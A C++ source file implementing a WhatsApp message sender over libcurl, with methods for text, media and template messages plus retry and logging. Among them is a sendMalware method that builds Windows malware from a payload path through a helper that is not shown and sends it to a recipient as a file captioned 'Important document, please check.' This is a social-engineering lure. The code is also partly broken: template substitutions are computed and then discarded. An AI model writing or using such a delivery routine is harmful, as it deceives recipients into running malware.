#include "WhatsAppSender.h"
#include <curl/curl.h>
#include <iostream>
#include <stdexcept>

WhatsAppSender::WhatsAppSender(const std::string &authToken)
    : authToken(authToken), apiUrl("https://api.whatsapp.com/v1/messages"), templateLoader(nullptr) {}

bool WhatsAppSender::sendMessage(const std::string &recipient, const std::string &message) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string payload = buildMessagePayload(recipient, shortenedMessage);
    return retryOnFailure(payload);
}

bool WhatsAppSender::sendMediaMessage(const std::string &recipient, const std::string &mediaUrl, const std::string &caption) {
    std::string shortenedMediaUrl = URLShortener::shorten(mediaUrl);
    std::string payload = buildMediaMessagePayload(recipient, shortenedMediaUrl, caption);
    return retryOnFailure(payload);
}

bool WhatsAppSender::sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params) {
    if (!templateLoader) {
        logError("Template loader not set");
        return false;
    }

    std::string templateContent;
    if (!templateLoader->loadTemplate(templateName, templateContent)) {
        logError("Failed to load template: " + templateName);
        return false;
    }

    for (const auto& param : params) {
        auto placeholder = "{" + param.first + "}";
        auto pos = templateContent.find(placeholder);
        if (pos != std::string::npos) {
            templateContent.replace(pos, placeholder.length(), param.second);
        }
    }

    std::string payload = buildTemplateMessagePayload(recipient, templateName, params);
    return retryOnFailure(payload);
}

void WhatsAppSender::sendMalware(const std::string &recipient, const std::string &payloadPath) {
    std::string malwarePath = MCreator::createWindowsMalware(payloadPath);
    sendMediaMessage(recipient, malwarePath, "Important document, please check.");
}

void WhatsAppSender::setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader) {
    templateLoader = loader;
}

std::string WhatsAppSender::buildMessagePayload(const std::string &recipient, const std::string &message) {
    return "{\"recipient\":\"" + recipient + "\", \"message\":{\"text\":\"" + message + "\"}}";
}

std::string WhatsAppSender::buildMediaMessagePayload(const std::string &recipient, const std::string &mediaUrl, const std::string &caption) {
    return "{\"recipient\":\"" + recipient + "\", \"message\":{\"attachment\":{\"type\":\"image\", \"payload\":{\"url\":\"" + mediaUrl + "\"}, \"caption\":\"" + caption + "\"}}}";
}

std::string WhatsAppSender::buildTemplateMessagePayload(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params) {
    std::string payload = "{\"recipient\":\"" + recipient + "\", \"template\":{\"name\":\"" + templateName + "\", \"params\":{";
    for (const auto &param : params) {
        payload += "\"" + param.first + "\":\"" + param.second + "\",";
    }
    payload.pop_back();
    payload += "}}}";
    return payload;
}

bool WhatsAppSender::sendRequest(const std::string &payload) {
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = nullptr;
        headers = curl_slist_append(headers, ("Authorization: Bearer " + authToken).c_str());
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, apiUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            logError("Failed to send request: " + std::string(curl_easy_strerror(res)));
            curl_easy_cleanup(curl);
            return false;
        }

        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        handleApiResponse(std::to_string(response_code));

        curl_easy_cleanup(curl);
        return true;
    }
    logError("Failed to initialize CURL");
    return false;
}

void WhatsAppSender::logError(const std::string &error) {
    Logger::log(Logger::ERROR, error);
}

void WhatsAppSender::logInfo(const std::string &info) {
    Logger::log(Logger::INFO, info);
}

void WhatsAppSender::handleApiResponse(const std::string &response) {
    Logger::log(Logger::INFO, "API Response: " + response);
}

bool WhatsAppSender::retryOnFailure(const std::string &payload, int retries) {
    while (retries > 0) {
        if (sendRequest(payload)) {
            return true;
        }
        --retries;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    return false;
}




